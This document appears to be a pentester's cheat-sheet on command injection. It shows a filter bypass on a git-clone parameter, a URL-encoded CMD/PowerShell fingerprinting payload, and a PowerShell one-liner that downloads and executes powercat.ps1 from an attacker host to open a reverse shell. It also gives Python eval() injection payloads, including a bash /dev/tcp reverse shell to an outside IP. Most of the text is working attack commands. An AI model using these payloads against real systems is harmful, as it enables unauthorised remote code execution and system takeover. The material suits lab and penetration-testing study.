
---
## PoC

Assuming there is an vulnerable Archive parameter on an utility which allows us to git clone repositorys.

Just prompting whoami doesn't work & the filter detects that it's command injection.

Let's analyze the scope of the filter.

When just prompting git it works & we can do more than just git clone 

```
git
```

Trying the following, actually provided us with who we are on the target system, so the scope of the filter works very loosely

```
git; whoami
```

Since whoami executed, we have command injection on the target system. Let's find out if either cmd or powershell get's executed


#### CMD or PowerShell?

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Note: That we have to URL-Encode the script.

```
git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

## RCE using PowerCat.ps1


Upload PowerCat.ps1 on target system.


On local machine.

```
python3 -m http.server 80 
```

Start up an listener on port 4444

```
nc -lvnp 4444
```

Prompt the following after the git command + after semicolon, this script downloads powercat.ps1 from our local machine & executes it's! 

```
IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.203%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.203%20-p%204444%20-e%20powershell
```

## Python Command Injection

If we have an python application, we should catch the package with nc and test command injection like this, in most cases it gets distributed through eval(). In which normal python syntax isn't working. 

Try this:

```
__import__('os').system('id')
```

RCE Command Injection (Linux)

```
__import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/192.168.227.246/80 0>&1"')
```



```
nc 10.113.152.8 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/192.168.227.246/80 0>&1"')
```